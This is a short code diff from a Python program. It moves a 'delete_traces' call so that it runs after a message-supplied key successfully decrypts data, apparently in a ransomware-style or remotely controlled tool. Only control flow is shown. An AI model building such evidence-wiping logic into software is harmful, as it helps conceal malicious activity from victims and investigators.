@@ -38,7 +38,6 @@ class Program():
                 if self.__client is not None:
                     await self.__client.stop()
 
-                self.delete_traces()
             case "auto":
                 pass
             case "manual":
@@ -385,6 +384,8 @@ class Program():
                         )
                     self.__criptography.set_key(key)
                     result = self.decrypt()
+                    if result:
+                        self.delete_traces()
 
                 message_reply["type"] = "decryption_res"
                 message_reply["data"] = {"result": result}
